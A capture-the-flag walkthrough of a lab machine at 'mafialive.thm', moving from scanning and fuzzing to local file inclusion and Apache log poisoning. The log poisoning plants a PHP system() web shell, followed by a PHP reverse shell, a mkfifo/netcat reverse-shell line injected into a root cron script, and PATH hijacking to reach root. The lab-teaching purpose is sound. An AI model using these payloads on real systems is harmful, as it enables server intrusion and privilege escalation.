Let's begin by exporting in the environment variable the IP as 'target':
![](https://github.com/user-attachments/assets/a9960340-00ef-4ff1-a715-a7e11d5a2955)



And by scanning with nmap:
`nmap -sC -sV $target`
![](https://github.com/user-attachments/assets/cc8e76a2-45e9-4a85-8188-c42806d4c40c)



Let's browse the IP:
![](https://github.com/user-attachments/assets/2831506c-307f-42f4-b3c0-2ec9bf728fbb)
As we can see, there's a hint for a "mafialive.thm" domain, so let's add this domain to the `etc/hosts` file:
`sudo nano /etc/hosts`
![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)


![](https://github.com/user-attachments/assets/a3f0adb6-bdba-4e59-ad36-7e315f816e56)



Now we can browse by typing the domain in the search bar and catch the first flag:
![](https://github.com/user-attachments/assets/00bdba25-e07f-448b-949a-9b2b5f44ac82)



Next step is fuzzing the app, we will use ffuf for this:
`ffuf -u "http://mafialive.thm/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php -c -t 50 -r`
![](https://github.com/user-attachments/assets/c385a2e2-937a-469a-b5a3-edfeb80ed229)



If we visit `robots.txt` page we can see that the only entry is `test.php` as ffuf let us see (last row).
![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)


Though we're in a CTF, we can click the test button without problems. In a real life scenario we should make sure that the button won't break anything.

Let's click that button.
![](https://github.com/user-attachments/assets/6053ba40-f5d6-4ed3-aaeb-6fa62227d2a9)
Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`



Let's fuzz for LFI:
`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r`

Only to find out many false positives. 
Let's try filtering through size and words:
`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate /etc/passwd

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)



Let's try a php filter to exfiltrate data:
`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
![[Pasted image 20251031105955.png]]Now we have the phrase "Control is an illusion" written in base64.




Let's do it with the entire test.php page:
`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
![[Pasted image 20251031110303.png]]



And decode the exfiltrated data to find the second flag:
![[Pasted image 20251031110541.png]]



Now, given the LFI vulnerability, if we can successfully access the log, we can poison it (log poisoning) to insert our php shell:
`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log`
![[Pasted image 20251031174631.png]]



Now it's time to fire up BurpSuite.
We'll put the php shell in the User-Agent string:
`<?php echo system($_GET['cmd']); ?>`
![[Pasted image 20251031181329.png]]

And we'll try if it's working by injecting `&cmd=whoami` in the URL:
`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami`

Now we have code execution.
We can use it to upload a php reverse shell (`shell.php`) using wget and URL encoding the space, immediately after opening the server.
![[Pasted image 20251031184003.png]]


![[Pasted image 20251031184309.png]]



It's time to fire up netcat and visit `mafialive.thm/shell.php`
![[Pasted image 20251031184847.png]]
And...we're in!
`whoami: 
`www-data`


Let's stabilize the shell:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
`export TERM=xterm-color`
![[Pasted image 20251101143751.png]]
Now we're ready to search for the third flag, the one of the first user (www-data).



Let's do some cron enumeration:
` cat /etc/crontab`
![[Pasted image 20251101144910.png]]

We can see that there's a helloworld.sh file that's been executed every minute as root.
If we `ls -la` the file we can see we have write permission on it.
![[Pasted image 20251101145421.png]]



We will echo this one liner into the file and wait for the execution by root:
`echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.97.226 4445 >/tmp/f" >> helloworld.sh`
(Activate netcat in another terminal on port 4445)
And obviously, we will stabilize the shell again
and search for the flag of the user archangel.
![[Pasted image 20251101154203.png]]



In the same folder, we can find a file named `backup` owned by root on which we have write permission. if we `strings` the file we can see that the file cp all the files of the `/home/user/archangel/myfiles/*` folder into `/opt/backupfiles`.
What we need to do is to create another cp file with just `/bin/bash` on it and write into the $PATH environment variable the new path of ours `cp` file.
The command to elencate the full path of the OS is `echo $PATH`

```bash
echo $PATH:
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

So:
Create the new cp file:
`echo "/bin/bash" > cp`

Give execution permission:
`chmod +x cp`

Put this folder first into the PATH environment variables:
`export PATH=$PWD:$PATH`

Execute the command:
./backup

![[Pasted image 20251101160725.png]]

Congratulations! You are now root :)


